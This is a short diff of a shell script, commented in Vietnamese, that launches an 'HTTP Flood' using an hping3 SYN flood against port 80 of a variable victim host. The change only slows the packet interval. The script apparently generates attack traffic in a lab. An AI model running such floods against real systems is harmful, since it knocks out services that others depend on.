@@ -7,5 +7,5 @@ echo "Dang cho web server khoi dong..."
 
 # Gui nhieu ket noi HTTP lien tuc bang hping3 SYN toi port 80
 # (khong can web server, chi can tao traffic TCP port 80)
-timeout $DURATION hping3 -S -p 80 -i u500 $VICTIM
+timeout $DURATION hping3 -S -p 80 -i u1000 $VICTIM
 echo "Hoan tat tan cong HTTP Flood!"
